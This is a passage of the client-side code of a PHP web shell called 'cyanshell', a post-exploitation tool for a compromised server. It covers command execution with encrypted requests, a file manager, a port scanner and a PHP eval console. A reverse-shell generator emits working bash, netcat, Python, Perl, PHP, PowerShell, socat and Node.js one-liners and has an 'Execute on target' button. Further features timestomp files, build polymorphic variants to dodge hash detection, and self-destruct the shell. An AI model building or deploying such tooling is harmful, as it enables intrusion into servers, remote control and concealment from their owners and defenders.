            <div class="payload-list" id="payloadList"></div>
        </div>
    </div>

    <!-- ═══════════ Diagnostics panel ═══════════ -->
    <div class="diag-panel" id="diagPanel">
        <h3>Pre-Flight Diagnostics</h3>
        <div class="diag-row">
            <span class="mark ok">✔</span>
            <span class="name">PHP Execution</span>
            <span class="info">PHP <?php echo e(PHP_VERSION); ?> on <?php echo e($os_family); ?> — active in this folder.</span>
        </div>
        <div class="diag-row">
            <span class="mark <?php echo empty($disabled_list) ? 'ok' : 'bad'; ?>">
                <?php echo empty($disabled_list) ? '✔' : '✘'; ?>
            </span>
            <span class="name">disable_functions</span>
            <span class="info">
                <?php if (empty($disabled_list)): ?>
                    empty (all functions allowed)
                <?php else: ?>
                    <?php echo count($disabled_list); ?> function(s) disabled — <?php echo e(implode(', ', array_slice($disabled_list, 0, 15))); ?><?php echo count($disabled_list) > 15 ? '…' : ''; ?>
                <?php endif; ?>
            </span>
        </div>
        <?php foreach ($all_methods as $m): $st = $method_status[$m]; ?>
        <div class="diag-row">
            <span class="mark <?php echo $st['ok'] ? 'ok' : 'bad'; ?>">
                <?php echo $st['ok'] ? '✔' : '✘'; ?>
            </span>
            <span class="name"><?php echo e($m); ?></span>
            <span class="info"><?php echo e($st['reason']); ?></span>
        </div>
        <?php endforeach; ?>
        <div class="diag-row">
            <span class="mark <?php echo $exec_method ? 'ok' : 'bad'; ?>">
                <?php echo $exec_method ? '✔' : '✘'; ?>
            </span>
            <span class="name">Active Method</span>
            <span class="info">
                <?php if ($exec_method): ?>
                    <strong style="color:var(--gr)"><?php echo e($exec_method); ?></strong>
                    (chain: <?php echo e(implode(' → ', $available)); ?>)
                <?php else: ?>
                    none — command execution unavailable
                <?php endif; ?>
            </span>
        </div>
        <div class="diag-row">
            <span class="mark <?php echo detect_os_family() === 'Linux' ? 'ok' : 'bad'; ?>">
                <?php echo detect_os_family() === 'Linux' ? '✔' : '✘'; ?>
            </span>
            <span class="name">FastCGI Takeover</span>
            <span class="info">
                <?php if (detect_os_family() !== 'Linux'): ?>
                    Linux only — unavailable on this platform
                <?php else:
                    $fcgi_socks = fastcgi_discover_sockets();
                ?>
                    <?php if (empty($fcgi_socks)): ?>
                        No PHP-FPM socket found
                    <?php else: ?>
                        <?php echo count($fcgi_socks); ?> socket(s) found —
                        <strong style="color:var(--gr)"><?php echo e($fcgi_socks[0]); ?></strong>
                    <?php endif; ?>
                <?php endif; ?>
            </span>
        </div>
        <div class="diag-row">
            <span class="mark <?php echo !empty($_SESSION['cyan_key']) ? 'ok' : 'bad'; ?>">
                <?php echo !empty($_SESSION['cyan_key']) ? '🔐' : '🔓'; ?>
            </span>
            <span class="name">Encryption</span>
            <span class="info">
                <?php if (!empty($_SESSION['cyan_key'])): ?>
                    <strong style="color:var(--gr)">AES-256-CBC active</strong>
                <?php else: ?>
                    Disabled — POST bodies sent in plaintext
                <?php endif; ?>
            </span>
        </div>
    </div>

    <div class="note"><span class="w">&#9888;</span> No outbound connection. Execution happens over local HTTP.</div>
</div>

<script>
(function () {
    'use strict';

    const body   = document.getElementById('body');
    const cmd    = document.getElementById('cmd');
    const picker = document.getElementById('cmdPicker');
    const diagBtn = document.getElementById('diagBtn');
    const diagPanel = document.getElementById('diagPanel');

    const hist = <?php echo json_encode(
        array_values($_SESSION['history'] ?? []),
        JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    ); ?>;
    let hi = hist.length;

    // ═══════════════════════════════════════════════════════
    //  Encryption (AES-256-CBC, PBKDF2-SHA256)
    // ═══════════════════════════════════════════════════════
    const ENCRYPTION_ON = <?php echo !empty($_SESSION['cyan_key']) ? 'true' : 'false'; ?>;
    let currentKey = null;

    async function cyanDeriveKey(pw) {
        const enc = new TextEncoder();
        const km = await crypto.subtle.importKey(
            'raw', enc.encode(pw), 'PBKDF2', false, ['deriveKey']
        );
        return crypto.subtle.deriveKey(
            { name: 'PBKDF2', salt: enc.encode('cyanshell-kdf-salt-v1'),
              iterations: 100000, hash: 'SHA-256' },
            km, { name: 'AES-CBC', length: 256 }, false, ['encrypt', 'decrypt']
        );
    }

    async function cyanEncrypt(plaintext, key) {
        const iv = crypto.getRandomValues(new Uint8Array(16));
        const ct = await crypto.subtle.encrypt(
            { name: 'AES-CBC', iv }, key, new TextEncoder().encode(plaintext)
        );
        const buf = new Uint8Array(16 + ct.byteLength);
        buf.set(iv, 0);
        buf.set(new Uint8Array(ct), 16);
        let s = '';
        for (let i = 0; i < buf.length; i++) s += String.fromCharCode(buf[i]);
        return btoa(s);
    }

    // Restore key from sessionStorage on page load
    (async () => {
        if (!ENCRYPTION_ON) return;
        const storedPw = sessionStorage.getItem('cyan_pw');
        if (storedPw) {
            try { currentKey = await cyanDeriveKey(storedPw); } catch (e) { currentKey = null; }
        }
    })();

    // Crypto panel toggle
    const cryptoBtn = document.getElementById('cryptoBtn');
    const cryptoPanel = document.getElementById('cryptoPanel');
    if (cryptoBtn && cryptoPanel) {
        cryptoBtn.addEventListener('click', () => cryptoPanel.classList.toggle('show'));
    }

    // Enable encryption
    const cyanSetBtn = document.getElementById('cyanSetBtn');
    if (cyanSetBtn) {
        cyanSetBtn.addEventListener('click', async () => {
            const pw = document.getElementById('cyanPw').value;
            if (!pw || pw.length < 8) { alert('Password must be at least 8 characters'); return; }
            sessionStorage.setItem('cyan_pw', pw);
            currentKey = await cyanDeriveKey(pw);
            const fd = new URLSearchParams();
            fd.append('__set_key', pw);
            await fetch(location.pathname, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: fd.toString()
            });
            location.reload();
        });
    }

    // Disable encryption
    const cyanOffBtn = document.getElementById('cyanOffBtn');
    if (cyanOffBtn) {
        cyanOffBtn.addEventListener('click', async () => {
            sessionStorage.removeItem('cyan_pw');
            currentKey = null;
            const fd = new URLSearchParams();
            fd.append('__del_key', '1');
            await fetch(location.pathname, {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: fd.toString()
            });
            location.reload();
        });
    }

    // Intercept main form submit → encrypt cmd
    const mainForm = document.getElementById('f');
    if (mainForm) {
        mainForm.addEventListener('submit', async (e) => {
            if (!ENCRYPTION_ON || !currentKey) return;
            e.preventDefault();
            const cmdInput = document.getElementById('cmd');
            const raw = cmdInput.value;
            if (!raw) { HTMLFormElement.prototype.submit.call(mainForm); return; }
            try {
                const encrypted = await cyanEncrypt('cmd=' + encodeURIComponent(raw), currentKey);
                cmdInput.value = '';
                const old = mainForm.querySelector('input[name="__enc"]');
                if (old) old.remove();
                const hidden = document.createElement('input');
                hidden.type = 'hidden';
                hidden.name = '__enc';
                hidden.value = encrypted;
                mainForm.appendChild(hidden);
                HTMLFormElement.prototype.submit.call(mainForm);
            } catch (err) {
                console.error('Encryption failed:', err);
                HTMLFormElement.prototype.submit.call(mainForm);
            }
        });
    }

    // ═══════════════════════════════════════════════════════
    //  Tab switching
    // ═══════════════════════════════════════════════════════
    function activateTab(name) {
        document.querySelectorAll('.tab').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
        const btn = document.querySelector('.tab[data-tab="' + name + '"]');
        const panel = document.getElementById('tab-' + name);
        if (btn) btn.classList.add('active');
        if (panel) panel.classList.add('active');
    }

    document.querySelectorAll('.tab').forEach(btn => {
        btn.addEventListener('click', () => {
            const tabName = btn.dataset.tab;
            activateTab(tabName);
            if (tabName === 'files' && !window.__fmLoaded) {
                fmLoad(fmCurrentPath || null);
                window.__fmLoaded = true;
            }
            if (tabName === 'payload' && !window.__payloadLoaded) {
                rshRender();
                window.__payloadLoaded = true;
            }
        });
    });

    // FIX: auto-switch to Console tab when ?console=1 is present, then clean URL
    (function initTabFromQuery() {
        const params = new URLSearchParams(location.search);
        if (params.get('console') === '1') {
            activateTab('console');
            // FIX: strip ?console=1 from URL without adding a history entry
            const cleanUrl = location.pathname + location.hash;
            history.replaceState({}, document.title, cleanUrl);
        }
    })();

    // ═══════════════════════════════════════════════════════
    //  File Manager
    // ═══════════════════════════════════════════════════════
    let fmCurrentPath = null;
    const fmList  = document.getElementById('fmList');
    const fmPath  = document.getElementById('fmPath');
    const fmPathInput = document.getElementById('fmPathInput');

    async function fmApi(action, params = {}) {
        // FIX: build a clean payload — never send fm_path twice
        const fd = new FormData();
        fd.append('fm_action', action);
        const pathToSend = Object.prototype.hasOwnProperty.call(params, 'fm_path')
            ? params.fm_path
            : fmCurrentPath;
        if (pathToSend !== null && pathToSend !== undefined && pathToSend !== '') {
            fd.append('fm_path', pathToSend);
        }
        for (const [k, v] of Object.entries(params)) {
            if (k === 'fm_path') continue;
            fd.append(k, v);
        }
        const r = await fetch(location.pathname, { method: 'POST', body: fd });
        return r.json();
    }

    async function fmLoad(path) {
        const params = (path !== null && path !== undefined && path !== '')
            ? { fm_path: path } : {};
        const data = await fmApi('list', params);
        if (!data.ok) {
            fmList.innerHTML = '<div class="fm-empty">Error: ' + fmEscape(data.err || 'unknown') + '</div>';
            return;
        }
        fmCurrentPath = data.path;
        fmPath.textContent = data.path;
        fmPathInput.value = data.path;
        fmList.innerHTML = '';
        if (data.items.length === 0) {
            fmList.innerHTML = '<div class="fm-empty">Empty directory</div>';
            return;
        }
        for (const it of data.items) {
            const row = document.createElement('div');
            row.className = 'fm-row';
            const icon = it.type === 'dir' ? '📁' : it.type === 'link' ? '🔗' : '📄';
            const size = it.type === 'dir' ? '—' : fmFormatSize(it.size);
            const mtime = new Date(it.mtime * 1000).toLocaleString();
            row.innerHTML =
                '<span class="icon">' + icon + '</span>' +
                '<span class="name ' + (it.type === 'dir' ? 'dir' : '') + '">' + fmEscape(it.name) + '</span>' +
                '<span class="size">' + size + '</span>' +
                '<span class="perm">' + fmEscape(it.perm) + '</span>' +
                '<span class="mtime">' + fmEscape(mtime) + '</span>';
            const full = data.path + '/' + it.name;
            row.addEventListener('dblclick', () => {
                if (it.type === 'dir') fmLoad(full);
                else fmEdit(full);
            });
            row.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                const action = prompt(
                    'Action for ' + it.name + '\n' +
                    '1 = Open/Edit, 2 = Download, 3 = Rename, 4 = Delete, 5 = Chmod', '1');
                if (action === '1') { if (it.type === 'dir') fmLoad(full); else fmEdit(full); }
                else if (action === '2') fmDownload(full, it.name);
                else if (action === '3') fmRename(full);
                else if (action === '4') fmDelete(full);
                else if (action === '5') fmChmod(full);
            });
            fmList.appendChild(row);
        }
    }

    function fmFormatSize(n) {
        if (n < 1024) return n + ' B';
        if (n < 1048576) return (n/1024).toFixed(1) + ' KB';
        if (n < 1073741824) return (n/1048576).toFixed(1) + ' MB';
        return (n/1073741824).toFixed(1) + ' GB';
    }
    function fmEscape(s) {
        return String(s).replace(/[&<>"']/g, c => ({
            '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
        }[c]));
    }

    async function fmDownload(path, name) {
        const fd = new FormData();
        fd.append('fm_action', 'download');
        fd.append('fm_path', path);
        const r = await fetch(location.pathname, { method: 'POST', body: fd });
        if (!r.ok) { alert('Download failed'); return; }
        const blob = await r.blob();
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = name;
        a.click();
    }

    async function fmDelete(path) {
        if (!confirm('Delete ' + path + '?')) return;
        const j = await fmApi('delete', { fm_path: path });
        if (j.ok) fmLoad(fmCurrentPath); else alert('Delete failed: ' + j.err);
    }

    async function fmRename(path) {
        const newName = prompt('New name:', path.split(/[\\/]/).pop());
        if (!newName) return;
        const j = await fmApi('rename', { fm_path: path, fm_new_name: newName });
        if (j.ok) fmLoad(fmCurrentPath); else alert('Rename failed: ' + j.err);
    }

    async function fmChmod(path) {
        const mode = prompt('New mode (octal, e.g. 0644):', '0644');
        if (!mode) return;
        const j = await fmApi('chmod', { fm_path: path, fm_mode: parseInt(mode, 8) });
        if (j.ok) fmLoad(fmCurrentPath); else alert('Chmod failed: ' + j.err);
    }

    async function fmEdit(path) {
        const j = await fmApi('read', { fm_path: path });
        if (!j.ok) { alert('Read failed: ' + j.err); return; }

        const editor = document.createElement('div');
        editor.className = 'fm-editor show';
        editor.innerHTML =
            '<div class="fm-editor-header">' +
                '<span class="fname">' + fmEscape(path) + '</span>' +
                '<button class="fm-btn" id="fmSaveBtn">💾 Save</button>' +
                '<button class="fm-btn danger" id="fmCloseBtn">✕ Close</button>' +
            '</div>' +
            '<textarea id="fmEditArea"></textarea>' +
            '<div class="fm-editor-footer" id="fmEditStatus"></div>';
        document.body.appendChild(editor);

        const area = editor.querySelector('#fmEditArea');
        const status = editor.querySelector('#fmEditStatus');
        area.value = j.content;

        editor.querySelector('#fmCloseBtn').addEventListener('click', () => editor.remove());
        editor.querySelector('#fmSaveBtn').addEventListener('click', async () => {
            const j2 = await fmApi('write', { fm_path: path, fm_content: area.value });
            status.textContent = j2.ok ? '✔ Saved' : '✘ ' + j2.err;
            status.style.color = j2.ok ? 'var(--gr)' : 'var(--rd)';
            setTimeout(() => status.textContent = '', 2000);
        });
    }

    document.getElementById('fmReloadBtn').addEventListener('click', () => fmLoad(fmCurrentPath));
    document.getElementById('fmUpBtn').addEventListener('click', () => {
        if (!fmCurrentPath) return;
        const parent = fmCurrentPath.replace(/[\\/][^\\/]+$/, '');
        fmLoad(parent || '/');
    });
    document.getElementById('fmGoBtn').addEventListener('click', () => fmLoad(fmPathInput.value));
    fmPathInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') { e.preventDefault(); fmLoad(fmPathInput.value); }
    });

    document.getElementById('fmMkdirBtn').addEventListener('click', async () => {
        const name = prompt('Directory name:');
        if (!name) return;
        const j = await fmApi('mkdir', { fm_path: fmCurrentPath, fm_new_name: name });
        if (j.ok) fmLoad(fmCurrentPath); else alert('mkdir failed: ' + j.err);
    });

    document.getElementById('fmUploadBtn').addEventListener('click', () => {
        document.getElementById('fmUploadInput').click();
    });
    document.getElementById('fmUploadInput').addEventListener('change', async (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const fd = new FormData();
        fd.append('fm_action', 'upload');
        fd.append('fm_path', fmCurrentPath);
        fd.append('fm_file', file);
        const r = await fetch(location.pathname, { method: 'POST', body: fd });
        const j = await r.json();
        if (j.ok) fmLoad(fmCurrentPath); else alert('Upload failed: ' + j.err);
        e.target.value = '';
    });

    // ═══════════════════════════════════════════════════════
    //  Port Scanner
    // ═══════════════════════════════════════════════════════
    document.getElementById('scanStartBtn').addEventListener('click', async () => {
        const target = document.getElementById('scanTarget').value.trim();
        const ports  = document.getElementById('scanPorts').value.trim();
        const timeout = document.getElementById('scanTimeout').value;
        const banner = document.getElementById('scanBanner').checked;
        if (!target || !ports) { alert('Fill target and ports'); return; }

        const results = document.getElementById('scanResults');
        results.innerHTML = '<div class="fm-empty">Scanning ' + fmEscape(target) + '… please wait.</div>';
        const startBtn = document.getElementById('scanStartBtn');
        startBtn.disabled = true;

        const fd = new FormData();
        fd.append('scan_target', target);
        fd.append('scan_ports', ports);
        fd.append('scan_timeout', timeout);
        if (banner) fd.append('scan_banner', '1');

        try {
            const r = await fetch(location.pathname, { method: 'POST', body: fd });
            const j = await r.json();
            if (!j.ok) {
                results.innerHTML = '<div class="fm-empty">Error: ' + fmEscape(j.err) + '</div>';
                return;
            }
            if (j.results.length === 0) {
                results.innerHTML = '<div class="fm-empty">No open ports found on ' +
                    fmEscape(j.target) + ' (' + j.scanned + ' scanned).</div>';
            } else {
                let html = '<table><thead><tr><th>Port</th><th>State</th><th>Banner / Service</th></tr></thead><tbody>';
                for (const rec of j.results) {
                    html += '<tr><td class="port-num">' + rec.port + '</td><td>' + rec.state + '</td>' +
                            '<td class="banner">' + (rec.banner ? fmEscape(rec.banner) : '—') + '</td></tr>';
                }
                html += '</tbody></table>';
                html += '<div style="margin-top:12px;color:var(--mu);font-size:.74rem;">' +
                        'Scanned ' + j.scanned + ' ports on ' + fmEscape(j.target) +
                        ' — found ' + j.results.length + ' open.</div>';
                results.innerHTML = html;
            }
        } catch (err) {
            results.innerHTML = '<div class="fm-empty">Network error: ' + fmEscape(err.message) + '</div>';
        } finally {
            startBtn.disabled = false;
        }
    });

    // ═══════════════════════════════════════════════════════
    //  PHP Console
    // ═══════════════════════════════════════════════════════
    document.getElementById('consoleRunBtn').addEventListener('click', () => {
        const code = document.getElementById('consoleCode').value;
        const timeout = document.getElementById('consoleTimeout').value;
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        const c = document.createElement('input'); c.name = 'phpcode'; c.value = code;
        const t = document.createElement('input'); t.name = 'php_timeout'; t.value = timeout;
        form.appendChild(c); form.appendChild(t);
        document.body.appendChild(form);
        form.submit();
    });

    document.getElementById('consoleClearBtn').addEventListener('click', () => {
        document.getElementById('consoleCode').value = '';
        document.getElementById('consoleOutput').textContent =
            '// Output will appear here after you click Execute.';
        // Clear server-side session via query param, then reload
        location.href = location.pathname + '?console=0';
    });

    // ═══════════════════════════════════════════════════════
    //  Reverse Shell Payload Generator
    // ═══════════════════════════════════════════════════════
    function rshBuild(lhost, lport, type) {
        const p = [];
        switch (type) {
            case 'bash':
                p.push(['Bash (/dev/tcp)', 'No external tools needed. Works on most modern Linux.',
                    `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`]);
                p.push(['Bash (nc fallback)', 'Uses netcat if /dev/tcp is unavailable.',
                    `bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1' 2>/dev/null || nc -e /bin/sh ${lhost} ${lport}`]);
                break;
            case 'nc-mkfifo':
                p.push(['Netcat + mkfifo', 'POSIX-compatible. Uses a named pipe.',
                    `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${lhost} ${lport} > /tmp/f`]);
                break;
            case 'nc-e':
                p.push(['Netcat -e', 'Traditional. Requires nc with -e flag.',
                    `nc -e /bin/sh ${lhost} ${lport}`]);
                p.push(['Netcat -c', 'BSD variant (macOS, some Linux).',
                    `nc ${lhost} ${lport} -c /bin/sh`]);
                break;
            case 'python3':
                p.push(['Python 3', 'PTY-enabled. Good interactive shell.',
                    `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`]);
                break;
            case 'python2':
                p.push(['Python 2', 'For legacy systems.',
                    `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'`]);
                break;
            case 'perl':
                p.push(['Perl', 'Available on most Unix systems.',
                    `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`]);
                break;
            case 'php':
                p.push(['PHP (fsockopen)', 'For shells running under PHP.',
                    `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`]);
                break;
            case 'powershell':
                p.push(['PowerShell', 'Windows target. Reverse TCP shell.',
                    `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sdata=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sdata,0,$sdata.Length);$s.Flush()};$c.Close()"`]);
                break;
            case 'socat':
                p.push(['Socat', 'Stable bidirectional. PTY-enabled.',
                    `socat TCP:${lhost}:${lport} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`]);
                break;
            case 'nodejs':
                p.push(['Node.js', 'For apps running Node.',
                    `(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=net.connect(${lport},"${lhost}");c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);})();`]);
                break;
        }
        return p;
    }

    function rshRender() {
        const lhost = document.getElementById('rshLhost').value.trim() || '10.0.0.1';
        const lport = document.getElementById('rshLport').value.trim() || '4444';
        const type = document.getElementById('rshType').value;
        const list = document.getElementById('payloadList');
        const payloads = rshBuild(lhost, lport, type);
        list.innerHTML = '';
        if (payloads.length === 0) {
            list.innerHTML = '<div class="fm-empty">No payload variants for this type.</div>';
            return;
        }
        for (const [title, desc, code] of payloads) {
            const card = document.createElement('div');
            card.className = 'payload-card';
            card.innerHTML =
                '<div class="header">' +
                    '<span class="lang">' + fmEscape(title) + '</span>' +
                    '<span class="desc">' + fmEscape(desc) + '</span>' +
                '</div>' +
                '<pre>' + fmEscape(code) + '</pre>' +
                '<div class="actions">' +
                    '<button class="fm-btn" data-copy>📋 Copy</button>' +
                    '<button class="fm-btn" data-exec>▶ Execute on target</button>' +
                '</div>';
            card.querySelector('[data-copy]').addEventListener('click', () => {
                navigator.clipboard.writeText(code).then(() => {
                    const b = card.querySelector('[data-copy]');
                    const t = b.textContent;
                    b.textContent = '✓ Copied!';
                    setTimeout(() => b.textContent = t, 1200);
                });
            });
            card.querySelector('[data-exec]').addEventListener('click', () => {
                if (!confirm('Execute this command on the target server?\n\n' +
                             'Make sure your listener is running on ' + lhost + ':' + lport)) return;
                const cmdInput = document.getElementById('cmd');
                if (cmdInput && mainForm) {
                    cmdInput.value = code;
                    activateTab('terminal');
                    setTimeout(() => mainForm.requestSubmit(), 100);
                }
            });
            list.appendChild(card);
        }
    }

    ['rshLhost', 'rshLport', 'rshType'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.addEventListener('input', rshRender);
        if (el) el.addEventListener('change', rshRender);
    });

    // ═══════════════════════════════════════════════════════
    //  Initialize terminal state
    // ═══════════════════════════════════════════════════════
    fmCurrentPath = <?php echo json_encode($cwd); ?>;

    if (body) {
        body.scrollTop = body.scrollHeight;
        body.addEventListener('click', () => cmd && cmd.focus());
    }
    if (cmd) cmd.focus();

    if (diagBtn && diagPanel) {
        diagBtn.addEventListener('click', () => diagPanel.classList.toggle('show'));
    }

    if (cmd) {
        cmd.addEventListener('keydown', e => {
            if (e.key === 'ArrowUp' && hi > 0) {
                e.preventDefault();
                hi--;
                cmd.value = hist[hi] || '';
                setTimeout(() => cmd.setSelectionRange(cmd.value.length, cmd.value.length), 0);
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (hi < hist.length - 1) { hi++; cmd.value = hist[hi] || ''; }
                else { hi = hist.length; cmd.value = ''; }
            }
        });
    }

    if (picker) {
        picker.addEventListener('change', function () {
            if (picker.value && cmd) {
                cmd.value = picker.value;
                cmd.focus();
                setTimeout(() => cmd.setSelectionRange(cmd.value.length, cmd.value.length), 0);
            }
        });
    }

    // ═══════════════════════════════════════════════════════
    //  §8 — Advanced Ops (Phase 3)
    // ═══════════════════════════════════════════════════════

        // ── §8.1 Timestomp (dual mode) ──
    const stompBtn = document.getElementById('stompBtn');
    if (stompBtn) {
        stompBtn.addEventListener('click', async () => {

            // ── Step 1: pick mode ────────────────────────
            const modeAns = prompt(
                '🕒 TIMESTOP\n\n' +
                'Choose mode:\n\n' +
                '  [1]  AUTO    — match mtime/atime with a sibling file\n' +
                '  [2]  MANUAL  — enter mtime/atime yourself\n\n' +
                'Type 1 or 2:',
                '1'
            );
            if (modeAns === null) return;
            const modeChoice = modeAns.trim();

            const payload = new URLSearchParams();
            payload.append('ops', 'timestomp');

            // ── Step 2A: AUTO mode ───────────────────────
            if (modeChoice === '1' || modeChoice.toLowerCase() === 'auto') {
                if (!confirm('AUTO mode\n\n' +
                             'The shell will pick a random sibling file in this folder\n' +
                             'and copy its modification + access time.\n\n' +
                             'Continue?')) return;
                payload.append('mode', 'auto');
            }
            // ── Step 2B: MANUAL mode ─────────────────────
            else if (modeChoice === '2' || modeChoice.toLowerCase() === 'manual') {
                // Suggest a default: 30 days ago
                const d = new Date(Date.now() - 86400000 * 30);
                const pad = n => String(n).padStart(2, '0');
                const suggested =
                    d.getFullYear() + '-' + pad(d.getMonth() + 1) + '-' + pad(d.getDate())
                    + ' ' + pad(d.getHours()) + ':' + pad(d.getMinutes()) + ':' + pad(d.getSeconds());

                const mtimeInput = prompt(
                    'MANUAL mode — Step 1/2\n\n' +
                    'New MODIFICATION time (mtime):\n\n' +
                    'Accepted formats:\n' +
                    '  • YYYY-MM-DD HH:MM:SS   →  2024-01-15 14:30:00\n' +
                    '  • YYYY-MM-DD            →  2024-01-15\n' +
                    '  • MM/DD/YYYY            →  01/15/2024\n' +
                    '  • any strtotime() string\n\n' +
                    'Suggested: ' + suggested,
                    suggested
                );
                if (mtimeInput === null) return;
                if (mtimeInput.trim() === '') { alert('mtime is required. Aborted.'); return; }

                const atimeInput = prompt(
                    'MANUAL mode — Step 2/2\n\n' +
                    'New ACCESS time (atime):\n\n' +
                    'Leave as-is (or clear it) to use the SAME value as mtime.\n\n' +
                    'mtime = ' + mtimeInput,
                    mtimeInput
                );
                if (atimeInput === null) return;

                const atimeFinal = (atimeInput.trim() === '') ? mtimeInput.trim() : atimeInput.trim();

                payload.append('mode', 'manual');
                payload.append('mtime', mtimeInput.trim());
                payload.append('atime', atimeFinal);
            }
            // ── Invalid choice ───────────────────────────
            else {
                alert('Invalid choice. Aborted.');
                return;
            }

            // ── Step 3: send request ─────────────────────
            try {
                const r = await fetch(location.pathname, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: payload.toString()
                });
                const j = await r.json();
                if (j.ok) {
                    let msg = '✔ Timestomp OK  [' + j.mode.toUpperCase() + ' mode]\n\n';
                    if (j.mode === 'auto') msg += 'Reference file: ' + j.ref + '\n\n';
                    msg += 'New mtime: ' + j.mtime_str + '\n';
                    msg += 'New atime: ' + j.atime_str;
                    alert(msg);
                } else {
                    alert('✘ Timestomp failed: ' + (j.err || 'unknown'));
                }
            } catch (e) { alert('Error: ' + e.message); }
        });
    }

    // ── §8.2 Polymorphic build ──
    const polyBtn = document.getElementById('polyBtn');
    if (polyBtn) {
        polyBtn.addEventListener('click', async () => {
            if (!confirm('Generate a polymorphic variant?\n\n' +
                         'A new file with randomized identifiers will be downloaded.\n' +
                         'Each build produces a unique SHA-256 fingerprint.')) return;
            const fd = new URLSearchParams();
            fd.append('ops', 'polybuild');
            try {
                const r = await fetch(location.pathname, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: fd.toString()
                });
                if (!r.ok) { alert('Build failed'); return; }
                const blob = await r.blob();
                const a = document.createElement('a');
                a.href = URL.createObjectURL(blob);
                a.download = 'cyanshell-variant.php';
                a.click();
            } catch (e) { alert('Error: ' + e.message); }
        });
    }

    // ── §8.3 Self-destruct ──
    const selfDestructBtn = document.getElementById('selfDestructBtn');
    if (selfDestructBtn) {
        selfDestructBtn.addEventListener('click', async () => {
            const ans = prompt(
                '⚠ SELF-DESTRUCT ⚠\n\n' +
                'This will wipe and delete this file from the server.\n' +
                'The action is irreversible.\n\n' +
                'Type CONFIRM to proceed:');
            if (ans !== 'CONFIRM') { alert('Cancelled.'); return; }

            const fd = new URLSearchParams();
            fd.append('ops', 'self_destruct');
            fd.append('confirm', 'CONFIRM');
            try {
                const r = await fetch(location.pathname, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: fd.toString()
                });
                const j = await r.json();
                if (j.ok) {
                    // Clear client-side state
                    try { sessionStorage.clear(); } catch (e) {}
                    try { localStorage.clear(); } catch (e) {}
                    document.body.innerHTML =
                        '<div style="padding:60px 20px;font-family:monospace;color:#10b981;text-align:center;background:#0f172a;min-height:100vh;">' +
                        '<h1 style="font-size:2rem;margin-bottom:16px;">✓ Self-destruct complete</h1>' +
                        '<p style="color:#64748b;">File wiped and removed. Client state cleared.</p>' +
                        '</div>';
                } else {
                    alert('Self-destruct failed. File may still exist.');
                }
            } catch (e) { alert('Error: ' + e.message); }
        });
    }
})();
</script>
</body>
</html>